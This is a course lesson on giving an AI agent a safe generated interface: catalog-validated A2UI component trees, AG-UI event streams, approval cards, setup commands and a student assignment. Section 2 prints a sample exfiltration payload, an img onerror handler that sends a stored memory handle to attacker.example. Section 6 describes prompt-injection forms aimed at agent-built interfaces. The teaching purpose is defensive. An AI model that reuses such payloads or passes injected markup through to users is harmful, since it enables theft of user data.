Session 14: A Face for the Agent — Generative UI, A2UI, and AG-UI
1. What this session is
Session 13 gave the agent a live graph, typed memory and A2A handoff, but every result still returned as text: a numbered list, a distilled answer or a Markdown table. This session gives the same system an interface the user can see and interact with, without allowing the model to generate or execute a single pixel of untrusted code.

The central claim is simple. An agent-generated interface is declarative data, validated against a component catalog already trusted by the client. Every user interaction returns to the agent as an event. The model never sends executable HTML, JavaScript or arbitrary markup, and the render client never executes anything written by the model. Under this boundary, accepting a generated interface from a remote agent is no more dangerous than accepting a validated JSON response.

The system uses two services. glc_v3 remains the gateway on port 8111, responsible for models, five Gemini keys, routing, quotas, cost, channels, voice and policy. S14Code is the Session 13 runtime evolved: the full live graph and typed memory from Session 13 with the new UI layer folded into one package, a single FastAPI service on port 8113. It owns the graph journal in-process and adds three components:

a surface builder that converts an agent outcome into a declarative component tree using only trusted catalog entries,
an event channel that streams graph events to the browser and returns user actions as new events,
a render client that maps catalog component types to real widgets without executing the agent’s text.
As always, the code is built before the lesson is written. Every example in this session is a replay from S14Code driving its own live graph through the real gateway: real prompts, real streamed events, a real declarative interface and a real injection attempt rejected by the catalog validator.


The same three-city comparison rendered in two ways. In Model draws HTML, the agent produces a dashboard whose markup contains a script that attempts to read a memory handle, while the layout changes every time the interface is regenerated. Switch to Declarative surface and press Render it live. The agent now emits only a component tree, the client maps each node to a trusted widget, the layout remains stable, and the embedded script never runs because no executable code ever leaves the agent.

2. First, watch the agent's UI betray you
Before defining declarative rendering, we first let the naive approach fail. That failure gives us every rule the rest of this session needs.

Give the Session 13 agent the same three-city task, but ask it to return an HTML dashboard:

Compare the populations of London, Berlin, and Paris, and return an
HTML dashboard I can open in a browser.
The agent completes the research and generates something that looks like a dashboard. Inside it are three serious failures.

The first is execution. The model may generate, or copy from a retrieved page, markup such as:

<img src="x" onerror="fetch('https://attacker.example/e?m='+localStorage.memoryHandle)">
The browser does not know whether this line came from the model, a tool result or a trusted developer. It sees an onerror handler and executes it. The dashboard renders correctly, but the memory handle leaves the machine. This is the Session 12 prompt-injection chain entering through a new surface: data returned by the agent is interpreted as executable code.

The second failure is consistency. Regenerating the same dashboard may change the order of the cities, the colours, the layout and the sorting. Users build muscle memory around stable interfaces. An interface that continuously rearranges itself becomes harder to use than a simple one that remains predictable.

The third failure is interaction. The generated dashboard may contain a button such as re-run with 2027 estimates, but the button has no reliable channel back to the agent. The HTML can display the last result, but it cannot return the user’s next action into the graph.

All three failures have the same root: we allowed the model to produce the interface itself. The interface therefore inherited the model’s authority, variance and isolation.

The agent may reference only components the client already trusts. An interface is declarative data, never executable code. Every user action returns to the agent as a validated event, never as authority.

This gives us three invariants:

Catalog invariant: Every component type must exist in a client-controlled catalog. Unknown or free-form components are rejected before rendering.
Data-not-code invariant: Components contain typed data fields. No field is evaluated as HTML, JavaScript or an unapproved URL.
Event invariant: An interface can affect the system only by emitting a named and validated event that re-enters the agent graph like any other input.
3. The declarative interface, from first principles
An interface needs only four nouns, deliberately aligned with the four graph nouns from Session 13.

Noun	Plain meaning
Component	One interface unit with a stable ID, a catalog type and typed properties.
Catalog	The closed set of component types the client knows how to render, with a schema for each type.
Data model	The values displayed or edited by the interface, kept separate from its structure.
Action	The only legal way a user changes anything: a named event with validated arguments, sent back to the agent.
The important decision is that the model does not receive a canvas it can paint freely. It proposes a small validated component tree. Following the A2UI pattern, we represent that tree as a flat adjacency list: an array of components connected by ID, with exactly one root.

{
  "root": "c0",
  "components": [
    {
      "id": "c0",
      "type": "Column",
      "children": ["c1", "c2"]
    },
    {
      "id": "c1",
      "type": "Heading",
      "text": {"$bind": "/title"}
    },
    {
      "id": "c2",
      "type": "Table",
      "columns": ["City", "Population"],
      "rows": {"$bind": "/rows"}
    }
  ]
}
A flat list is easier for a streaming model than a deeply nested tree. The model can append, replace or patch one component at a time without regenerating the entire interface.

Two details provide the safety boundary. First, every type must exist in the trusted catalog. Column, Heading and Table render because the client defines them. RawHtml cannot render because it does not exist in the catalog. Second, displayed values arrive through a $bind path into the data model, rather than as executable markup written inline by the model. Structure and data travel separately, and neither one is treated as code.

Data binding, and when the agent sees a change
The data model is addressed using JSON Pointer paths. /title refers to the title, while /rows points to the array rendered by the table. Inputs use two-way binding: when the user edits a bound field, the client updates its local data model immediately, so the interface remains responsive. The agent is still unaware of the change.

user types in the "year" field  → client data model updates, agent remains unaware
user presses "Re-run"           → action emitted: {name: "rerun", args: {year: 2027}}
                                → event enters the S13 graph
                                → agent plans a surface patch
The server sees the change only when the user deliberately commits an action. That action contains a named event and typed arguments, validated in the same way the graph validates a planner patch. Local edits therefore remain local until the user submits them, and there is no direct path from typing in an input field to calling a tool.

Build the primitive before adopting the standard
We do not begin by importing A2UI. When the model can make a decision safely, we let it decide. When the boundary itself matters, we first build the smallest version that makes the boundary visible.

S14Code therefore begins with a small first-principles renderer, a catalog of trusted component types and a validator that rejects every unknown type. Only after the primitive works, and after we have watched it refuse an unsupported component, do we give the pattern its name: A2UI, Google’s declarative agent-interface protocol, at v1.0 release-candidate in mid-2026.

The primitive already contains the core idea. The agent emits declarative components, the client renders only catalog-approved types, and the validator blocks everything else. Building this first turns the A2UI specification into a description of a system we already understand, rather than a standard we are trusting without understanding.

The full catalog the agent can draw from holds 23 components. Fifteen are adopted directly from A2UI’s Basic set — Row, Column, List, Card, Divider, Text, Image, TextField, CheckBox, Slider, InputChoice, DateTime, Button, Tabs and Modal — and eight are custom extensions that A2UI Basic lacks: BarChart, Sparkline, StatTile, ProgressBar, Timeline, DataTable, Notice and ApprovalCard. A2UI does not ship a fixed set you must use. Its Basic catalog, renamed from Standard in v0.9, is a starting point that each application extends, so we adopt A2UI’s Basic names for everything that overlaps and add only the few components a dashboard actually needs. The renderer itself is A2UI-style, built from first principles to understand the protocol, rather than an implementation of the literal A2UI wire format.


The whole catalog on one board: the fifteen components we take from A2UI’s Basic set and the eight we add for a dashboard. Hover any tile to see its typed properties and the single binding that feeds it, and note that not one of them exposes a property the client would ever execute.


Drag a component from the trusted catalog into the interface and watch the adjacency list update. Edit a bound field and see the client data model change while the agent-facing event log remains empty. Press the action button and watch the first validated event cross back to the agent. Toggle Bind raw text instead to inject an inline script and watch the data-not-code invariant reject it before rendering.

4. The event stream was already there
Session 13’s graph did more than compute an answer. It recorded a durable, ordered journal of the entire run: run_started, graph_patched, task_started, task_succeeded and task_failed. That journal is already an interface stream. It only needs a client that can read it.

S14Code reads the journal through Server-Sent Events, a one-way HTTP stream from the server to the browser. Because the runtime owns the journal in-process, the event channel reads it directly and forwards each event as it arrives. These events are mapped to the vocabulary of AG-UI, CopilotKit’s event-based agent-interface protocol, rather than creating another custom event format.

S13 graph event	AG-UI event	Interface behaviour
run_started	RUN_STARTED	Open the run panel and show the prompt
task_started	STEP_STARTED	Add a node card in the running state
task_succeeded	STEP_FINISHED + STATE_DELTA	Mark the node complete and patch the data model
graph_patched	STATE_DELTA	Patch the data model as the planner revises the graph
run_finished	RUN_FINISHED	Close the run and enable actions
AG-UI defines roughly thirty event types across eight categories in its mid-2026 form. We use only the small subset required here. Two additional categories are important. The state category carries complete snapshots and RFC 6902 JSON Patch deltas, allowing the client to reconstruct itself after reconnecting. The reasoning category carries reasoning as a separate stream. A dropped connection therefore does not destroy the interface: the client requests a STATE_SNAPSHOT and rebuilds itself, just as the Session 13 graph replays its journal after a crash.

The critical property is that the browser contains no graph logic. It only projects the event stream. A node card appears because the stream reports that a task started. A table changes because the stream carries a state delta. Nothing from the graph is moved into the browser, and nothing in the browser can affect the graph except a named, validated action.

S14 graph  ──journal──▶  S14 event channel  ──SSE──▶  render client
    ▲                                                      │
    └───────────── validated action event ◀───────_────────┘

Press play and watch the real three-city run stream as an AG-UI event tape driving the interface above it. Scrub back and forth: the interface is a pure function of the events up to that point. Cut the connection mid-run and reconnect to see a STATE_SNAPSHOT rebuild the interface from the durable journal.


Watch a graph_patched event arrive when the planner judges its own outcome and revises the graph mid-run. The node view rewires itself and a STATE_DELTA repaints the affected cards, all without the browser holding a shred of planner logic.

5. Two protocols, one surface
A common explanation sets A2UI against AG-UI and asks which one to choose. By mid-2026, that framing is already wrong. The two protocols solve different problems and are designed to work together.

A2UI describes what to render. AG-UI carries the interaction between the agent and the surface. A2UI payloads travel through AG-UI events.

CopilotKit, which stewards AG-UI, was also a launch partner for Google’s A2UI and provides middleware for carrying A2UI surfaces over AG-UI. In S14Code, the surface builder produces an A2UI component tree, while the event channel delivers that tree and every later update as AG-UI events. A2UI’s own spec calls this rendered thing a surface; throughout this session we call it the interface, and the two names mean the same object. A2UI defines the interface. AG-UI defines how that interface stays connected to the agent.

A third standard answers a different question. MCP Apps, introduced in January 2026 as the first official extension to MCP, defines how an interactive surface runs inside a host such as ChatGPT or Claude rather than inside an application we own. An MCP App declares a ui:// resource, which the host renders inside a sandboxed iframe. The surface communicates with the host over JSON-RPC, and every tool call passes through the host’s own consent and authorization path.

The same security principle holds across all three systems: the surface is declared and constrained, while every user action crosses a validated boundary before it can affect the agent or call a tool.

These standards fit into the protocol stack the course has been building since Session 4.

MCP
agent ↔ tools

A2A
agent ↔ agent

AG-UI
agent ↔ surface
(transport)

A2UI
what to render
(payload)

MCP Apps
UI inside a chat host

Each protocol owns a different boundary. MCP connects agents to tools. A2A connects agents to other agents. AG-UI carries events and shared state between an agent and a surface. A2UI describes the surface itself. MCP Apps places an interactive surface inside a chat host we do not control.

The decision is straightforward:

Use AG-UI when we own the application and need a live channel for events, streaming and shared state.
Use A2UI when an agent, including a remote agent reached through A2A, must describe a surface that our client can render safely.
Use MCP Apps when the interface must appear inside a host such as ChatGPT or Claude.
Use them together in the common case: an A2UI surface delivered through AG-UI events inside an application we built.

The same three-city surface, split down the middle. On the left, the A2UI component tree that says what to render. On the right, the AG-UI event stream that carries it and its updates. Change the data on the agent side and watch a STATE_DELTA cross the middle and repaint the left without re-sending the tree.

6. The injection wall
Now we replay the Session 12 attack at the interface layer, because this architecture exists to survive exactly this situation. A remote agent, a compromised tool, or a page the agent fetched attempts to smuggle executable behaviour into the surface.

The attack can take four forms:

An unknown component type such as RawHtml, caught by the catalog.
A known component carrying an extra handler property such as onclick, caught as data-not-code.
A bound value containing markup, caught as data-not-code.
An action the catalog never registered, caught by the event invariant.
Every attack stops at the same deterministic boundary. We do not ask another model to inspect the surface and behave carefully. We validate it against a closed catalog.

def validate_surface(surface, catalog):
    for c in surface.components:
        if c.type not in catalog:                  # catalog invariant
            reject(c, "unknown component type")

        schema = catalog[c.type]

        for key, value in c.props.items():
            if key not in schema.allowed_props:    # no smuggled handlers
                reject(c, f"unknown property {key}")

            if schema.props[key] == "text" and looks_like_markup(value):
                reject(c, "text property carries markup")  # data-not-code

    if surface.actions - catalog.registered_actions:
        reject(surface, "unregistered action")     # event invariant
The render client never interprets a property as script, never assigns a bound value to innerHTML, and never follows a URL the catalog has not approved. An onclick handler does not reach the DOM because onclick is not a valid property in the schema. A bound value containing markup is either rejected or displayed as literal text. An action the catalog never registered never reaches the graph, because the event channel admits only registered actions.

This is the Session 12 security invariant applied to generated interfaces:

External content never becomes instructions, and a component description is still external content.

No model can be trusted never to generate a hostile surface. The architecture therefore does not depend on the model resisting the attack. It makes the attack irrelevant by ensuring that declarative interface data has no path to execution, authority, or an unapproved tool call.


Pick one of four injected interfaces from the dropdown and press Render. Watch the validator name the exact invariant each one breaks and refuse it, while the safe part of the interface still renders. Toggle Disable the validator to see the same payload execute against an unguarded client, then turn it back on and watch the wall hold.

7. Human-in-the-loop is the waiting node with a button
Session 13 gave the graph a waiting state. A node could park, release its worker and resume when an external event arrived, whether from a webhook, an A2A push or a human approval. The mechanism already existed. This session gives that approval a visible interface.

When the planner reaches a high-impact action, the node enters waiting, and the surface builder emits an approval component bound to the exact pending parameters.

{
  "id": "ap",
  "type": "ApprovalCard",
  "summary": {"$bind": "/pending/summary"},
  "params": {"$bind": "/pending/params"},
  "confirm": {
    "action": "approve",
    "args": {"$bind": "/pending/params"}
  },
  "reject": {
    "action": "reject"
  }
}
The user sees exactly what will happen and selects Approve or Reject. That press becomes a validated action event and resumes the parked node, exactly as a webhook would.

The important safety property comes from Session 12: approval is bound to the final parameters. The arguments displayed to the user, the arguments approved by the user and the arguments dispatched by the agent must be identical. The surface cannot widen or replace them. If a compromised client sends an approve event with different arguments, the resume path compares them against the parameters stored on the parked node and rejects the mismatch.

A user who approves a transfer of one amount cannot be made to authorise another, because the approved parameters and the executed parameters are the same recorded object.

This closes the loop opened earlier in the session. The dead button is now a real control, but it gains no direct authority over the graph or its tools. It performs the only safe operation available to a generated interface: emit a named, validated event that re-enters the graph through its existing control boundary.


Run an action that requires approval and watch the node park in waiting while the approval card appears. Press Approve to resume it and watch the graph finish. Then switch to Tamper the arguments and try to approve a widened action from the client: the resume path compares against the parked parameters and rejects it, and the node stays waiting.

8. The other pole: when the model draws the whole thing
Everything so far constrains the model to a trusted catalog. A louder branch of generative UI takes the opposite approach and lets the model author the entire experience as code. The results can be impressive, but the production trade-offs are much harder.

The visible examples make the idea easy to understand. Google’s dynamic view in Gemini generates a custom HTML and JavaScript experience for each prompt and runs it inside infrastructure Google controls. Anthropic’s Imagine with Claude generated a desktop-like interface screen by screen, while its successor renders interactive visuals directly inside a response. Vercel’s v0 generates complete React applications from prompts, and its API allows other agents to request those interfaces programmatically.

The trade is straightforward. Model-authored code provides maximum expressiveness: any layout, any interaction and no fixed catalog to outgrow. It also introduces three costs. The first is latency, because generating, compiling and mounting a complete interface takes far longer than rendering a validated component tree. The second is security, because model-authored code can only be accepted safely inside a sandbox whose owner controls and accepts the blast radius. This is why serious implementations run inside vendor-controlled environments rather than directly inside an ordinary application. The third is consistency, because regenerated interfaces can move controls, change layouts and destroy the muscle memory users depend on.

The practical distinction is that fully generative interfaces win on expressiveness and demos, while constrained declarative interfaces win on security, speed and production stability. Google’s A2UI represents the constrained form of the same broader idea: the model may describe the experience, but it may only use structures the client already trusts. The boundary changes at the point where trust changes hands.


A single dial from fully constrained to fully generative. Slide it and watch three meters move: expressiveness up, and latency and attack surface up with it. The markers show where A2UI, Vercel's json-render, Thesys C1, MCP Apps, and Gemini dynamic view sit. The footer carries Nielsen's mid-2026 scoreboard: he predicted generative UI would break through in 2026 and scored his own prediction 47 percent, off track, living mostly in frameworks and prototypes rather than daily software.

9. Honest failures and what this does not solve
Two interfaces are worth more than another clean screenshot.

The first is the reconnect. A run streamed to a browser, the network dropped for nine seconds, and the client held a partial interface. The event invariant made the recovery boring: on reconnect the client requested a state snapshot, S14Code replayed it from the same durable journal the runtime already keeps, and the interface was whole again with no duplicated actions and no lost content. That is the Session 13 crash-replay property reused without new machinery, because the interface was never anything more than a projection of a durable event stream.

The second is an interface the agent could not honestly build. Asked to render a live map of a delivery the system had no coordinates for, the planner did not emit a Map component with invented pins. It emitted a Notice component that said the location data was not available and offered an action to request it. A generated interface can lie in a way a paragraph cannot, by drawing a chart that looks authoritative over data that does not exist. The same honesty discipline from Session 13 applies: a component is evidence, and evidence the system does not have does not get drawn.

The boundaries this session does not cross are real and belong to a production team.

Accessibility. A catalog render is only as accessible as its widgets. A generated interface can produce a valid component tree that is still hostile to a screen reader if the catalog components are not themselves accessible. The catalog is where that work lives, and this session ships a small one.
Latency at the generative pole. The constrained path we build is fast. Any feature that reaches for full generation inherits the seconds-to-minutes cost, and that decision belongs to the operator.
The host boundary in MCP Apps. An interface inside a chat host is only as safe as the host's sandbox and consent path. Backslash and other researchers flagged the MCP Apps surface in 2026 as new attack surface precisely because a template and a postMessage channel are new things to get wrong.
Governance. As of mid-2026 A2UI and MCP Apps sit under neutral or shared stewardship while AG-UI remains vendor-stewarded. That is an adoption risk to weigh, not a technical one, and it is the kind of thing that changes between when this is written and when you deploy.
10. Run the two services
Ollama must be running for the Session 13 pieces, as before. You now run two terminals.

Clone the two official repositories beside one another.

git clone https://github.com/theschoolofai/glc_v3.git
git clone https://github.com/theschoolofai/S14Code.git
workshop/
├── glc_v3/      # gateway, port 8111
└── S14Code/     # live graph + memory + UI, port 8113, A2A on 8114
Terminal one, the gateway:

cd glc_v3
uv sync
uv run glc serve
Terminal two, the Session 14 runtime:

cd S14Code
uv sync
export GLC_BASE_URL=http://127.0.0.1:8111
export S14_GATEWAY_PROVIDER=gemini
uv run s14code serve
S14Code listens on 8113. It is the Session 13 runtime evolved: it drives the graph through the gateway, owns the graph journal in-process, and serves the render client and the event channel from the same service. The one provider credential still lives with the gateway, exactly as before.

Health and capabilities:

curl http://127.0.0.1:8113/healthz
curl http://127.0.0.1:8113/v1/catalog          # the trusted component catalog
Start a run and open its interface. The run is created through the same agent API as last week, now served by S14Code itself.

RUN=$(curl -s http://127.0.0.1:8113/v1/agent/runs \
  -H 'Content-Type: application/json' \
  -d '{
    "prompt": "Compare the populations of London, Berlin, and Paris.",
    "tenant_id": "course", "project_id": "s14",
    "user_id": "student-01", "agent_id": "assistant"
  }' | jq -r .run_id)

open "http://127.0.0.1:8113/s/$RUN"
Watch the event stream directly if you want to see the tape before the interface:

curl -N http://127.0.0.1:8113/v1/runs/$RUN/events
Use the runtime through its own API and client. Reaching into the render client's internals from a console proves less than it appears to, exactly as calling a store method directly did in Session 13.

11. The proof suite
Establish the floors before changing anything.

cd glc_v3   && uv run pytest -q
cd ../S14Code && uv run pytest -q
The Session 14 suite proves the three invariants directly: the catalog test rejects unknown types, the data-not-code test refuses smuggled markup and handlers, and the event test admits only registered actions. A render-client property test then asserts that the client executes no component property and never assigns a bound value to innerHTML under any input. Because S14Code is now the runtime, it also carries the full inherited Session 13 suite forward — the graph and memory tests run beside the new UI tests, roughly 110 in all — and the separate gateway suite confirms the models layer beneath is untouched.

The non-browser benchmark reuses the Session 13 prompts and adds an interface for each. Before the UI layer earns new capabilities, it must first prove that it can present the existing work accurately, safely and without inventing evidence.

Prompt family	What the interface proves
Compare three city populations	A table bound to graph state and updated as researcher nodes complete
Search asyncio, read top three	A live node view streamed from the graph journal through AG-UI events
Remember a birthday, make reminders	An approval card bound to the exact calendar-write parameters and resumed by a tap
Index the Attention paper	A document interface that renders chunks with source spans, never as raw HTML
Slow remote A2A report	A remote agent’s A2UI payload validated against the local catalog before rendering
Render data the system does not have	An honest Notice instead of an invented chart
Four injected interfaces	The validator rejects each attack and identifies the invariant it violated
12. The assignment
Two parts. The first adds one component to the shared vocabulary every other student draws from. The second builds a real application on top of it, where the agent answers only by composing an interface. Both submit as one pull request to S14Code, and both need a running demo, because an interface that never composed for a real request proves nothing.

Part 1: contribute a component to the catalog
Add one component the catalog does not have yet and that a real interface would want: a Map, a Kanban board, a Gantt or calendar, a code diff, a heatmap, an image gallery, a rating, a step wizard. It lives in three places:

a ComponentSpec in s13code/ui/catalog.py (within S14Code) with typed props and a source tag,
a renderer in the render client that draws it from text nodes and executes no value,
one captured run where Gemini composes your component into a real interface without being told to name it, because compose_surface reads the catalog and offers your component to the model on its own.
You can get ambitious and add a completely new skill designed to make specific kind of UIs as well, like presentations.

Your component becomes part of the vocabulary the whole batch composes with. Show that the three invariants still hold for it: an unknown type is rejected, a bound value carrying markup is refused, and an unregistered action never crosses back.

Part 2: build a UI-only application
Build an application in a domain you care about where the agent answers only by composing an interface, and never with a paragraph of text. The IIT-JEE tutor in this session is one shape: "teach me for IIT JEE" returns subject cards, a tap returns a topic list, a tap returns a lesson and a quiz. A trip planner returns a day-by-day timeline and a comparison table. A budgeting assistant returns stat tiles and a chart. Every turn is a composed interface, and every tap is an event that earns the next turn.

The architecture already carries the whole application. Run S14Code, send a prompt to /v1/agent/runs with respond_as: "ui", read the composed interface from /v1/runs/{id}/composed, render it, and turn a tap into the next turn. The bare-minimal /app viewer shows the entire loop in about two hundred lines; fork it or write your own shell.

The application must:

answer every turn as a composed, catalog-validated interface, never as raw text,
use the rich component the situation calls for: a chart where there is a series, a table where there are rows, a timeline where there is a sequence,
carry a conversation across at least three turns, where a tap in one interface shapes the next,
run end to end against the real gateway.
Attack the boundary you stand on
Before you submit, try to break the wall your application depends on. Send a prompt engineered to make the agent emit a RawHtml node, a bound value that is markup, or an action the catalog never registered, and show the validator refusing it while the safe part of the interface still renders. A generated interface that a hostile prompt turns into executable markup breaks the one promise the session makes.

What you submit
Fork theschoolofai/S14Code, branch, and open one pull request. Paste the URL into your Axiom submission with a short screen recording of your application composing and reshaping interfaces live. The pull-request description carries:

the component you added and one interface that used it,
the application in one paragraph: the domain, and what each turn composes,
three prompts and the three different interfaces they produced,
the adversarial prompt and the validator refusing it,
an honest verdict: where composing the interface at runtime beat a fixed screen, and where it fell short — latency, an interface that rearranged itself, a wrong component. You may conclude the future is not here yet, as long as you say why,
the commands that reproduce everything from a fresh checkout.
Secrets, .env, credentials, personal memory, and unrestricted paths never enter the pull request. Synthetic identities are mandatory.

Scoring
Area	Points
A useful component, correctly added and composed by the agent unprompted	20
An application that answers only in composed interfaces, across turns	30
Genuine variety: the right rich components for the data	15
A working, recorded end-to-end demo	15
The three invariants preserved, shown by your adversarial prompt	10
An honest verdict that engages the real trade-offs	10
An application that dumps one text block into a single component, however clever the prompt, scores nothing on variety. An interface that renders model-authored markup fails the invariant it claims to hold. A design document with no running application scores zero.